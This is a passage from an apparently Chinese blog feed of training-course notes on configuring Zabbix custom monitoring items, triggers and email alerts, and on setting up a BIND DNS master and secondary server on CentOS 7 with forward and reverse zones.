shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# iostat | awk &#x27;/sda/&#x27;<br>sda               8.58       219.30       118.61    2116225    1144610<br>[root@localhost ~]# iostat | awk &#x27;/sda/&#123;print $2&#125;&#x27;<br>8.58<br></code></pre></td></tr></table></figure><h6 id="server端修改zabbix-agent配置文件"><a href="#server端修改zabbix-agent配置文件" class="headerlink" title="server端修改zabbix-agent配置文件"></a>server端修改zabbix-agent配置文件</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">修改 UserParameter=</span><br>[root@localhost ~]# vim /etc/zabbix/zabbix_agentd.conf<br>UserParameter=sda_tps,iostat|awk &#x27;/sda/&#123;print $2&#125;&#x27;<br><br>[root@localhost ~]# systemctl restart zabbix-agent.service<br></code></pre></td></tr></table></figure><h6 id="server端zabbix-server测试监控项取值"><a href="#server端zabbix-server测试监控项取值" class="headerlink" title="server端zabbix-server测试监控项取值"></a>server端zabbix-server测试监控项取值</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# yum -y install zabbix-get.x86_64 &amp;&gt;/dev/null <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 若返回值为 0，代表上条命令成功执行</span> <br>[root@localhost ~]# echo $? <br>0<br>[root@localhost ~]# zabbix_get -s 127.0.0.1 -k vfs.file.cksum[/etc/passwd]<br>1696492884<br>·-s 后跟 agent 的 IP 地址 <br>·-k 后跟 key 值 <br><br>[root@localhost ~]# zabbix_get -s 127.0.0.1 -k sda_tps<br>11.79<br><span class="hljs-meta">#</span><span class="bash"> 可见自定义 key 已成功导入</span><br></code></pre></td></tr></table></figure><h6 id="在web界面增加自定义监控项"><a href="#在web界面增加自定义监控项" class="headerlink" title="在web界面增加自定义监控项"></a>在web界面增加自定义监控项</h6><p>来到对应主机处，点击<strong>监控项</strong>，主机选择zabbix主服务器，右上角创建监控项</p><p><img src="https://img-blog.csdnimg.cn/a69c2b38529c4b7d948ed8d78028ae6c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>名称可用中文，键位必须用英文</p><p>由于 tps 值存在小数，信息类型处，需要选择单位为浮点数</p><p><img src="https://img-blog.csdnimg.cn/16f7b74a6cdf4098a8cd0ee89315b141.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>可以发现它进了监控</p><p><img src="https://img-blog.csdnimg.cn/6089aef83f7b405aa983444d1e683e18.png#pic_center" alt="Zabbix"></p><p>在监控-》最新数据中，可以找到他的身影</p><p><img src="https://img-blog.csdnimg.cn/035f9e546188451f99cddf0b051c8c68.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><h5 id="自定义触发器"><a href="#自定义触发器" class="headerlink" title="自定义触发器"></a>自定义触发器</h5><p>我这里以system.sw.packages为测试，为了方便听到警报声，只要安装一个软件则报警</p><p>监控项：</p><p><img src="https://img-blog.csdnimg.cn/634ded0bed884a469aa611afc1c84f2b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>触发器：</p><p><img src="https://img-blog.csdnimg.cn/b3ad70830a7048ec88b66eed3839e213.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>直接点右边添加，选择表达式</p><p><img src="https://img-blog.csdnimg.cn/141544aeaaf4403bbfeb490f352c5089.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>只要有软件安装，这个值就会变</p><p>在192.168.241.134的主机上随便装点东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">这里装装ruby语言</span><br>[root@localhost ~]# yum install -y ruby<br></code></pre></td></tr></table></figure><p>很快啊！</p><p><img src="https://img-blog.csdnimg.cn/4723f5826ae14e8ba49b19415bd1874d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>如何定义恢复触发器？</p><p>进入对应触发器编辑页面 -&gt; 恢复表达式 -&gt; 输入恢复表达式 -&gt; 更新</p><p><img src="https://img-blog.csdnimg.cn/59fb7809369e4876a1a69831f2c5702f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>把软件卸了就行</p><h4 id="5-邮件报警"><a href="#5-邮件报警" class="headerlink" title="5.邮件报警"></a>5.邮件报警</h4><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><p>1.进入 <strong>设置</strong> <strong>-&gt;</strong> <strong>POP3/SMTP/IMAP</strong>-&gt;开启POP3/SMTP服务，获取163邮箱授权码</p><p><img src="https://img-blog.csdnimg.cn/2514b43fd0044753b38265b9d2781b6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="163邮箱授权密码"></p><p>假如你是163邮箱的使用者，则下面会用到</p><p><img src="https://img-blog.csdnimg.cn/30899ee72ef2474f982d5acf0eec72e5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="服务器表"></p><p>2.进入 zabbix<strong>管理</strong> <strong>-&gt;</strong> <strong>报警媒介类型</strong> <strong>-&gt;</strong> 右上角<strong>创建媒体类型</strong></p><p><img src="https://img-blog.csdnimg.cn/52f4c353094a46cdaf87f8ee2ce6bd37.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="创建媒体类型"></p><p>可以发现qiye_email</p><p><img src="https://img-blog.csdnimg.cn/8b75b240cb03437995b1859597d8d26f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="qiye _mail"></p><p>我们测试一下</p><p><img src="https://img-blog.csdnimg.cn/fff4d85f4f9949ffb07999077c21f70d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="test"></p><p>正常收到！</p><p><img src="https://img-blog.csdnimg.cn/5ef82d05809e4a6c8e5ad036520dfb12.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="yadaze!"></p><p>3.进入 <strong>管理</strong> <strong>-&gt;</strong> <strong>用户</strong> <strong>-&gt;</strong> 右上角<strong>创建用户</strong></p><p><img src="https://img-blog.csdnimg.cn/e173e6b0fda24a429bbc15d42b3e7cb8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="创建用户"></p><p>设置报警媒介</p><p><img src="https://img-blog.csdnimg.cn/8b251348c2fc409ea625a020de12c8bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="报警媒介"></p><p>然后是权限</p><p><img src="https://img-blog.csdnimg.cn/1487790ae56b4fd98166ac23f2107fae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="权限"></p><p>添加即可！</p><p>4.进入 <strong>配置</strong> <strong>-&gt;</strong> <strong>动作</strong> <strong>-&gt;</strong> 右上角<strong>创建动作</strong></p><p>设置多个动作条件，并选择计算方式为 或</p><p><img src="https://img-blog.csdnimg.cn/d4a3f164a26d4875afe35d1e05ea98d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="动作条件"></p><p>然后是操作界面，自己根据需求设置</p><p><img src="https://img-blog.csdnimg.cn/142894bcc630426c919c9387f6dc5a67.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="操作细节"></p><p>配置操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">主题： <br>故障&#123;TRIGGER.STATUS&#125;,服务器:&#123;HOSTNAME1&#125;发生: &#123;TRIGGER.NAME&#125;故障! <br><br>消息： <br>告警主机:&#123;HOSTNAME1&#125; <br>告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125; <br>告警等级:&#123;TRIGGER.SEVERITY&#125; <br>告警信息: &#123;TRIGGER.NAME&#125; <br>告警项目:&#123;TRIGGER.KEY1&#125; <br>问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125; <br>当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125; <br>事件ID:&#123;EVENT.ID&#125; <br></code></pre></td></tr></table></figure><p>更新即可</p><h5 id="报警"><a href="#报警" class="headerlink" title="报警"></a>报警</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 192.168.241.134端新增用户</span> <br>[root@localhost ~]# useradd test1 <br>[root@localhost ~]# echo &quot;123&quot; | passwd --stdin test1 <br>更改用户 test1 的密码 。 <br>passwd：所有的身份验证令牌已经成功更新。 <br>[root@localhost ~]# systemctl restart zabbix-server.service<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/35e015143a7043a8a8c9600e20717a28.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="成功触发"></p><p>ya<em>da</em>ze！</p>]]></content>
    
    
    <categories>
      
      <category>实训</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Zabbix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实训Day2-DNS</title>
    <link href="/2021/11/24/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%A4%A9-DNS%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/11/24/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%A4%A9-DNS%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="实训第二天-DNS的搭建"><a href="#实训第二天-DNS的搭建" class="headerlink" title="实训第二天-DNS的搭建"></a>实训第二天-DNS的搭建</h1><h4 id="1-DNS安装与环境"><a href="#1-DNS安装与环境" class="headerlink" title="1. DNS安装与环境"></a>1. DNS安装与环境</h4><p>ps：跟陈总的文档完全不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">安装<span class="hljs-built_in">bind</span></span><br>yum install -y bind bind-utils<br></code></pre></td></tr></table></figure><p>关于环境：</p><p>不先处理一些环境问题，后面处理起来，人要疯</p><p>环境：必要两台centos7，复数其它任意网段主机（可有可无）</p><p><strong>首先是固定自己的ip（是啊，教室到宿舍，在到教室，网络一断，又得重新配）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">主NDS服务器</span><br>vim /etc/sysconfig/network-scripts/ifcfg-eno16777736<br>TYPE=Ethernet<br>BOOTPROTO=static    #改为static<br>DEFROUTE=yes<br>PEERDNS=yes<br>PEERROUTES=yes<br>IPV4_FAILURE_FATAL=no<br>IPV6INIT=yes<br>IPV6_AUTOCONF=yes<br>IPV6_DEFROUTE=yes<br>IPV6_PEERDNS=yes<br>IPV6_PEERROUTES=yes<br>IPV6_FAILURE_FATAL=no<br>NAME=eno16777736<br>UUID=118af5e5-92de-42b0-a1c6-619c8d9d6c81   #可删<br>ONBOOT=yes      #改为yes<br>IPADDR=192.168.241.129    #本地ip<br>PREFIX=24<br>GATEWAY=192.168.241.2<br>DNS1=192.168.241.129      #本地ip<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">容灾所使用的服务器（由于是主服务器克隆而来，网卡一摸一样）</span><br>vim /etc/sysconfig/network-scripts/ifcfg-eno16777736<br>TYPE=Ethernet<br>BOOTPROTO=static<br>DEFROUTE=yes<br>PEERDNS=yes<br>PEERROUTES=yes<br>IPV4_FAILURE_FATAL=no<br>IPV6INIT=yes<br>IPV6_AUTOCONF=yes<br>IPV6_DEFROUTE=yes<br>IPV6_PEERDNS=yes<br>IPV6_PEERROUTES=yes<br>IPV6_FAILURE_FATAL=no<br>NAME=eno16777736<br>IPADDR=192.168.241.134     #自己的ip，注意区分<br>PREFIX=24<br>GATEWAY=192.168.241.2<br>ONBOOT=yes<br>DNS1=192.168.241.134      #自己的ip，注意区分<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">记得更新网络配置</span><br>service network restart<br></code></pre></td></tr></table></figure><p>其次是关闭防火墙和SELinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">控制变量，人人有责</span><br>[root@localhost ~] systemctl stop firewalld<br>[root@localhost ~] setenforce 0<br></code></pre></td></tr></table></figure><h4 id="2-DNS的配置和部署"><a href="#2-DNS的配置和部署" class="headerlink" title="2. DNS的配置和部署"></a>2. DNS的配置和部署</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">尝试启动DNS</span><br>[root@localhost ~] systemctl status named<br>named.service - Berkeley Internet Name Domain (DNS)<br>   Loaded: loaded (/usr/lib/systemd/system/named.service; disabled)<br>   Active: inactive (dead)<br></code></pre></td></tr></table></figure><p>没有配置文件，无法启动很正常</p><h5 id="主配置文件修改"><a href="#主配置文件修改" class="headerlink" title="主配置文件修改"></a>主配置文件修改</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~] vim /etc/named.conf<br><br>options &#123;<br>        listen-on port 53 &#123; any; &#125;;         #ip地址修改成any<br>        listen-on-v6 port 53 &#123; ::1; &#125;;<br>        directory       &quot;/var/named&quot;;<br>        dump-file       &quot;/var/named/data/cache_dump.db&quot;;<br>        statistics-file &quot;/var/named/data/named_stats.txt&quot;;<br>        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;<br>        recursing-file  &quot;/var/named/data/named.recursing&quot;;<br>        secroots-file   &quot;/var/named/data/named.secroots&quot;;<br>        allow-query     &#123; any; &#125;;        #一样改成any<br></code></pre></td></tr></table></figure><h5 id="配置正向解析与反向解析"><a href="#配置正向解析与反向解析" class="headerlink" title="配置正向解析与反向解析"></a>配置正向解析与反向解析</h5><p>后面的容灾也需要以下配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/named.rfc1912.zones<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">在末尾增加以下</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">正向解析</span><br>zone &quot;qiye.com&quot; IN &#123;<br>        type master;<br>        file &quot;qiye.com.zone&quot;;#正向解析文件路径<br>        allow-transfer &#123; 192.168.241.134; &#125;;       #允许转移数据（容灾）<br>        allow-update &#123; 192.168.241.134; &#125;;       #允许这个ip更新数据（容灾）<br>&#125;;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">反向解析</span><br>zone &quot;241.168.192.in-addr.arpa&quot; IN &#123;<br>        type master;<br>        file &quot;qiye.com.local&quot;;#反向解析文件路径<br>        allow-transfer &#123; 192.168.241.134; &#125;;     #允许转移数据（容灾）<br>        allow-update &#123; 192.168.241.134; &#125;;#允许这个ip更新数据（容灾）<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">cd</span>到正向解析和反向解析文件所在的文件夹</span><br>cd /var/named/<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">创建正向解析文件和反向解析文件：</span><br>[root@localhost named] ls<br>data  dynamic  named.ca  named.empty  named.localhost  named.loopback  slaves<br><span class="hljs-meta">#</span><span class="bash">将模板复制过来，即：</span><br>[root@localhost named] cp -p named.localhost qiye.com.zone<br>[root@localhost named] cp -p named.loopback qiye.com.local<br>ps：假如他们的所属组是root，那么请将他们所属组改成named（我这里不用）<br>[root@localhost named]# ll<br>total 24 #所有者 所属组<br>drwxrwx---. 2 named named    6 Aug 31 07:53 data<br>drwxrwx---. 2 named named    6 Aug 31 07:53 dynamic<br>-rw-r-----. 1 root  named 2253 Apr  5  2018 named.ca<br>-rw-r-----. 1 root  named  152 Dec 15  2009 named.empty<br>-rw-r-----. 1 root  named  152 Jun 21  2007 named.localhost<br>-rw-r-----. 1 root  named  168 Dec 15  2009 named.loopback<br>-rw-r-----. 1 root  named  168 Dec 15  2009 qiye.com.local<br>-rw-r-----. 1 root  named  152 Jun 21  2007 qiye.com.zone<br>drwxrwx---. 2 named named    6 Aug 31 07:53 slaves<br><span class="hljs-meta">#</span><span class="bash">修改所属组语句：</span><br>[root@localhost named] chown -R named:named qiye.com.local<br>[root@localhost named] chown -R named:named qiye.com.zone<br></code></pre></td></tr></table></figure><p>对两个文件进行DNS域名解析编辑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost named] vim qiye.com.zone<br>[root@localhost named] vim qiye.com.local<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">正向解析文件</span><br><span class="hljs-meta">$</span><span class="bash">TTL 1D</span><br>@       IN SOA  qiye.com. rname.invalid. (<br>                                        0       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      @<br>        A       127.0.0.1<br>        AAAA    ::1<br>        NS      ns.qiye.com.<br>ns      IN A    192.168.241.129<br>www     IN A    192.168.241.129<br>email   IN A    192.168.241.129<br>c2      IN A    192.168.241.134<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">反向解析文件</span><br><span class="hljs-meta">$</span><span class="bash">TTL 1D</span><br>@       IN SOA  @ rname.invalid. (<br>                                        0       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      @<br>        A       127.0.0.1<br>        AAAA    ::1<br>        PTR     localhost.<br>        NS      ns.qiye.com.<br><br>ns      A       192.168.241.129<br>129     PTR     www.qiye.com.<br>129     PTR     email.qiye.com.<br>134     PTR     c2.qiye.com.<br></code></pre></td></tr></table></figure><h5 id="修改DNS配置"><a href="#修改DNS配置" class="headerlink" title="修改DNS配置"></a>修改DNS配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost named] vim /etc/resolv.conf<br>nameserver 192.168.241.129<br>nameserver 114.114.114.114  #可有可无，防止断网<br></code></pre></td></tr></table></figure><h5 id="再次启动DNS服务"><a href="#再次启动DNS服务" class="headerlink" title="再次启动DNS服务"></a>再次启动DNS服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">没任何返回，则正常运行</span><br>[root@localhost named] systemctl start named<br><span class="hljs-meta">#</span><span class="bash">53端口检查状态</span><br>[root@localhost named]  lsof -i :53<br>COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME<br>named   43300 named   21u  IPv4  91166      0t0  TCP localhost:domain (LISTEN)<br>named   43300 named   22u  IPv4  91168      0t0  TCP www.qiye.com:domain (LISTEN)<br>named   43300 named   23u  IPv6  91170      0t0  TCP localhost:domain (LISTEN)<br>named   43300 named   26u  IPv4  91426      0t0  TCP 192.168.241.147:domain (LISTEN)<br>named   43300 named  512u  IPv4  91164      0t0  UDP localhost:domain <br>named   43300 named  513u  IPv4  91167      0t0  UDP www.qiye.com:domain <br>named   43300 named  514u  IPv6  91169      0t0  UDP localhost:domain <br>named   43300 named  515u  IPv4  91425      0t0  UDP 192.168.241.147:domain <br><br></code></pre></td></tr></table></figure><h4 id="3-实现DNS域名解析"><a href="#3-实现DNS域名解析" class="headerlink" title="3.实现DNS域名解析"></a>3.实现DNS域名解析</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">成功正反向解析域名和ip，ya*da*ze！</span><br>[root@localhost named] nslookup 192.168.241.129<br>129.241.168.192.in-addr.arpaname = email.qiye.com.<br>129.241.168.192.in-addr.arpaname = www.qiye.com.<br><br>[root@localhost named] nslookup www.qiye.com<br>Server:192.168.241.129<br>Address:192.168.241.129#53<br><br>Name:www.qiye.com<br>Address: 192.168.241.129<br><br>[root@localhost named] nslookup c2.qiye.com<br>Server:192.168.241.129<br>Address:192.168.241.129#53<br><br>Name:c2.qiye.com<br>Address: 192.168.241.134<br></code></pre></td></tr></table></figure><p>截图为证！</p><p><img src="https://img-blog.csdnimg.cn/718ea8daed1b47e481d0383093abf851.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="验证成功"></p><h4 id="4-容灾处理"><a href="#4-容灾处理" class="headerlink" title="4.容灾处理"></a>4.容灾处理</h4><p>在克隆的centos7上的操作（192.168.241.134）</p><p>无非是对配置文件的处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code 